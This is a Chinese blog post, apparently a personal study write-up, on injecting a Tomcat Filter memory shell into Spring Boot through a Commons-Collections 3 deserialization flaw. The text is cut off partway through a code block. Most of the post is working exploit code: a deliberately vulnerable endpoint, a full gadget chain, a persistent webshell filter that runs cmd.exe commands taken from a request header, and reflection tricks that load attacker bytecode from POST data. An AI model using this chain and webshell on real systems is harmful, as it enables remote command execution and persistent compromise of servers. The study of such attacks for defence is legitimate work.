@@ -1,0 +1,511 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/css/images/bg/favicon.ico">
+  <link rel="icon" type="image/png" href="/css/images/bg/favicon.ico">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="摸鱼">
+  <meta name="author" content="Aluvion">
+  <meta name="keywords" content="">
+  <title>借助CC3反序列化漏洞注入Spring Boot Filter内存马 - Twings</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/5.12.1/css/all.min.css" />
+<link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
+<link  rel="stylesheet" href="https://cdn.staticfile.org/mdbootstrap/4.13.0/css/mdb.min.css" />
+<link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/3.0.1/github-markdown.min.css" />
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">
+
+
+
+  <link  rel="stylesheet" href="/lib/prettify/tomorrow-night-eighties.min.css" />
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link defer rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+<!-- 自定义样式保持在最底部 -->
+
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Twings</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/">首页</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/archives/">归档</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/tags/">标签</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/about/">关于</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/links/">友链</a>
+          </li>
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="view intro-2" id="background" parallax=true
+         style="background: url('/css/images/bg/bg5.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask rgba-black-light flex-center">
+          <div class="container text-center white-text fadeInUp">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              
+                <p class="mt-3 post-meta">
+                  <i class="fas fa-calendar-alt" aria-hidden="true"></i>
+                  星期六, 五月 6日 2023, 11:24 晚上
+                </p>
+              
+
+              <p class="mt-1">
+                
+                  
+                  <span class="post-meta">
+                    <i class="far fa-chart-bar"></i>
+                    1.7k 字
+                  </span>
+                
+
+                
+                  
+                  <span class="post-meta">
+                      <i class="far fa-clock"></i>
+                      8 分钟
+                  </span>
+                
+
+                
+                  <!-- 不蒜子统计文章PV -->
+                  
+                  <span id="busuanzi_container_page_pv" class="post-meta" style="display: none">
+                    <i class="far fa-eye" aria-hidden="true"></i>
+                    <span id="busuanzi_value_page_pv"></span> 次
+                  </span>
+                
+              </p>
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5 z-depth-3" id="board">
+          <div class="post-content mx-auto" id="post">
+            
+            <div class="markdown-body">
+              <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>学习。</p>
+<span id="more"></span>
+
+<hr>
+<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><h4 id="Web服务端"><a href="#Web服务端" class="headerlink" title="Web服务端"></a>Web服务端</h4><p>CC3依赖：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>反序列化接口：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/deserialize&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">deserialize</span><span class="params">(<span class="meta">@RequestParam(value = &quot;s&quot;)</span>String s, Model model)</span> &#123;</span><br><span class="line">    System.out.println(s);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(Base64.getDecoder().decode(s));</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> objectInputStream.readObject();</span><br><span class="line">        model.addAttribute(<span class="string">&quot;res&quot;</span>, obj.getClass().getName());</span><br><span class="line">    &#125;<span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        <span class="comment">// pass</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;deserialize&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="Payload生成端"><a href="#Payload生成端" class="headerlink" title="Payload生成端"></a>Payload生成端</h4><p>cc3、javassist和tomcat依赖：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.javassist<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javassist<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.27.0-GA<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat.embed<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-embed-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>9.0.65<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>生成序列化对象，通过调用TemplatesImpl类的defineTransletClasses函数的方式可以在服务端远程导入内存马类：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_class[i] = loader.defineClass(_bytecodes[i]);</span><br></pre></td></tr></table></figure>
+
+<p>但是为了不抛出异常，该类需要继承自AbstractTranslet：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="type">Class</span> <span class="variable">superClass</span> <span class="operator">=</span> _class[i].getSuperclass();</span><br><span class="line"></span><br><span class="line"><span class="comment">// Check if this is the main class</span></span><br><span class="line"><span class="keyword">if</span> (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123;</span><br><span class="line">    _transletIndex = i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>将生成序列化对象的代码和内存马分离：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> TemplatesImpl <span class="title function_">getTemplatesImpl</span><span class="params">()</span> <span class="keyword">throws</span> NotFoundException, CannotCompileException, IOException, NoSuchFieldException &#123;</span><br><span class="line">    <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">    pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(AbstractTranslet.class));</span><br><span class="line">    <span class="type">CtClass</span> <span class="variable">clazz</span> <span class="operator">=</span> pool.get(PwnFilter.class.getName());</span><br><span class="line">    <span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.get(AbstractTranslet.class.getName());</span><br><span class="line">    clazz.setSuperclass(superClass);</span><br><span class="line">    <span class="type">byte</span>[] classBytes = clazz.toBytecode();</span><br><span class="line">    <span class="type">TemplatesImpl</span> <span class="variable">poc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">    Utils.setField(poc, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;classBytes&#125;);</span><br><span class="line">    Utils.setField(poc, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;Pwn&quot;</span>);</span><br><span class="line">    Utils.setField(poc, <span class="string">&quot;_tfactory&quot;</span>, TransformerFactoryImpl.newInstance());</span><br><span class="line">    <span class="keyword">return</span> poc;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> Transformer <span class="title function_">getChainedInstantiateTransformer</span><span class="params">(Object poc)</span> &#123;</span><br><span class="line">    Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;poc&#125;),</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getObject</span><span class="params">()</span> <span class="keyword">throws</span> NoSuchFieldException, CannotCompileException, NotFoundException, IOException &#123;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">poc</span> <span class="operator">=</span> getTemplatesImpl();</span><br><span class="line">    <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> getChainedInstantiateTransformer(poc);</span><br><span class="line">    Map&lt;String, String&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    map.put(<span class="string">&quot;Aluvion&quot;</span>, <span class="string">&quot;Twings&quot;</span>);</span><br><span class="line">    <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(map, transformerChain);</span><br><span class="line">    <span class="type">TiedMapEntry</span> <span class="variable">entry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;Twings&quot;</span>);</span><br><span class="line">    <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">    Utils.setField(badAttributeValueExpException, <span class="string">&quot;val&quot;</span>, entry);</span><br><span class="line">    <span class="keyword">return</span> badAttributeValueExpException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>注入内存马的代码可以写在static代码块，也可以写在无参构造函数中：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PwnFilter</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span>, Filter &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">cl</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader();</span><br><span class="line">        <span class="type">StandardRoot</span> <span class="variable">resources</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> cl.getClass().getSuperclass().getSuperclass().getDeclaredField(<span class="string">&quot;resources&quot;</span>);</span><br><span class="line">            f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            resources = (StandardRoot)f.get(cl);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// pass</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (resources != <span class="literal">null</span>) &#123;</span><br><span class="line">            System.out.println(resources.getClass().getName());</span><br><span class="line">            <span class="type">StandardContext</span> <span class="variable">context</span> <span class="operator">=</span> (StandardContext)resources.getContext();</span><br><span class="line">            <span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();</span><br><span class="line">            filterDef.setFilter(<span class="keyword">new</span> <span class="title class_">PwnFilter</span>());</span><br><span class="line">            filterDef.setFilterName(<span class="string">&quot;filterShell&quot;</span>);</span><br><span class="line">            context.addFilterDef(filterDef);</span><br><span class="line">            <span class="type">FilterMap</span> <span class="variable">filterMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();</span><br><span class="line">            filterMap.setFilterName(<span class="string">&quot;filterShell&quot;</span>);</span><br><span class="line">            filterMap.addURLPattern(<span class="string">&quot;/filterShell&quot;</span>);</span><br><span class="line">            context.addFilterMap(filterMap);</span><br><span class="line">            context.filterStart();</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Failed...&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String[] cmd = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, ((RequestFacade)request).getHeader(<span class="string">&quot;Twings&quot;</span>)&#125;;</span><br><span class="line">            <span class="type">byte</span>[] result = <span class="keyword">new</span> <span class="title class_">java</span>.util.Scanner(<span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(cmd).start().getInputStream()).useDelimiter(<span class="string">&quot;\\A&quot;</span>).next().getBytes();</span><br><span class="line">            response.getWriter().write(<span class="keyword">new</span> <span class="title class_">String</span>(result));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// pass</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="注入内存马"><a href="#注入内存马" class="headerlink" title="注入内存马"></a>注入内存马</h3><p>需要发两个包，首先生成序列化数据，然后交给接口触发反序列化漏洞，导入类的同时将内存马注入到了SpringBoot服务中：</p>
+<p><img src="/css/images/real-filter/2023050601.png" srcset="/img/loading.gif"></p>
+<p>然后再发包访问内存马执行命令并得到回显：</p>
+<p><img src="/css/images/real-filter/2023050602.png" srcset="/img/loading.gif"></p>
+<h3 id="另一种Context获取方式"><a href="#另一种Context获取方式" class="headerlink" title="另一种Context获取方式"></a>另一种Context获取方式</h3><p>想要注入Filter内存马就要先获取到Context，而在执行过程中，Tomcat会通过ApplicationFilterChain访问Filter链，其存在两个static属性，通过反射可以访问：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> ThreadLocal&lt;ServletRequest&gt; lastServicedRequest;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> ThreadLocal&lt;ServletResponse&gt; lastServicedResponse;</span><br></pre></td></tr></table></figure>
+
+<p>还有一个同样是static的布尔属性成员WRAP_SAME_OBJECT，当该成员的值为true时，ApplicationFilterChain类的internalDoFilter函数会有一些特殊的处理方式：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (ApplicationDispatcher.WRAP_SAME_OBJECT) &#123;</span><br><span class="line">    lastServicedRequest.set(request);</span><br><span class="line">    lastServicedResponse.set(response);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>该internalDoFilter函数会在执行过程中被调用，并进入service()函数交予SpringBoot控制器代码，所以交给反序列化时还不会触发后续的重置操作：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">finally</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (ApplicationDispatcher.WRAP_SAME_OBJECT) &#123;</span><br><span class="line">        lastServicedRequest.set(<span class="literal">null</span>);</span><br><span class="line">        lastServicedResponse.set(<span class="literal">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>同时由于Context会在Request中保存，因此可以通过修改WRAP_SAME_OBJECT的方式，让ApplicationFilterChain类帮我们把Request保存起来。</p>
+<p>这种方式最大的问题就是长度很容易超出上限，所以分成三步进行，第一步修改WRAP_SAME_OBJECT：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GetContext</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">GetContext</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">WRAP_SAME_OBJECT_FIELD</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationDispatcher&quot;</span>).getDeclaredField(<span class="string">&quot;WRAP_SAME_OBJECT&quot;</span>);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">lastServicedRequestField</span> <span class="operator">=</span> ApplicationFilterChain.class.getDeclaredField(<span class="string">&quot;lastServicedRequest&quot;</span>);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">lastServicedResponseField</span> <span class="operator">=</span> ApplicationFilterChain.class.getDeclaredField(<span class="string">&quot;lastServicedResponse&quot;</span>);</span><br><span class="line">            setFinalStatic(WRAP_SAME_OBJECT_FIELD);</span><br><span class="line">            setFinalStatic(lastServicedRequestField);</span><br><span class="line">            setFinalStatic(lastServicedResponseField);</span><br><span class="line">            ThreadLocal&lt;ServletRequest&gt; lastServicedRequest = (ThreadLocal&lt;ServletRequest&gt;)lastServicedRequestField.get(<span class="literal">null</span>);</span><br><span class="line">            ThreadLocal&lt;ServletResponse&gt; lastServicedResponse = (ThreadLocal&lt;ServletResponse&gt;)lastServicedResponseField.get(<span class="literal">null</span>);</span><br><span class="line">            <span class="keyword">if</span> (!WRAP_SAME_OBJECT_FIELD.getBoolean(<span class="literal">null</span>) || lastServicedRequest == <span class="literal">null</span> || lastServicedResponse == <span class="literal">null</span>) &#123;</span><br><span class="line">                WRAP_SAME_OBJECT_FIELD.setBoolean(<span class="literal">null</span>,<span class="literal">true</span>);</span><br><span class="line">                lastServicedRequestField.set(<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">ThreadLocal</span>());</span><br><span class="line">                lastServicedResponseField.set(<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">ThreadLocal</span>());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// pass</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFinalStatic</span><span class="params">(Field field)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">modifiersField</span> <span class="operator">=</span> Field.class.getDeclaredField(<span class="string">&quot;modifiers&quot;</span>);</span><br><span class="line">        modifiersField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        modifiersField.setInt(field, field.getModifiers() &amp; ~Modifier.FINAL);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>此时可以在ApplicationFilterChain的静态成员中获取Request和Context，第二步就可以注入内存马，由于HTTP对Header和URI长度有限制，因此将内存马和注入代码放在POST数据中，再从Request中取出：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InjectFilter</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> ApplicationFilterChain.class.getDeclaredField(<span class="string">&quot;lastServicedRequest&quot;</span>);</span><br><span class="line">            f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">modifiersField</span> <span class="operator">=</span> Field.class.getDeclaredField(<span class="string">&quot;modifiers&quot;</span>);</span><br><span class="line">            modifiersField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            modifiersField.setInt(f, f.getModifiers() &amp; ~Modifier.FINAL);</span><br><span class="line">            ThreadLocal&lt;ServletRequest&gt; lastServicedRequest = (ThreadLocal&lt;ServletRequest&gt;)f.get(<span class="literal">null</span>);</span><br><span class="line">            <span class="type">ServletRequest</span> <span class="variable">servletRequest</span> <span class="operator">=</span> lastServicedRequest.get();</span><br><span class="line">            <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">            <span class="type">BufferedReader</span> <span class="variable">br</span> <span class="operator">=</span> servletRequest.getReader();</span><br><span class="line">            String str;</span><br><span class="line">            <span class="keyword">while</span> ((str = br.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                sb.append(str);</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println(sb.toString());</span><br><span class="line">            <span class="type">byte</span>[] payload = Base64.getDecoder().decode(sb.toString());</span><br><span class="line">            <span class="type">Method</span> <span class="variable">defineClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.ClassLoader&quot;</span>).getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>, <span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">int</span>.class);</span><br><span class="line">            defineClass.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> (Class)defineClass.invoke(Thread.currentThread().getContextClassLoader(), payload, <span class="number">0</span>, payload.length);</span><br><span class="line">            clazz.newInstance();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// pass</span></span><br><span class="line">        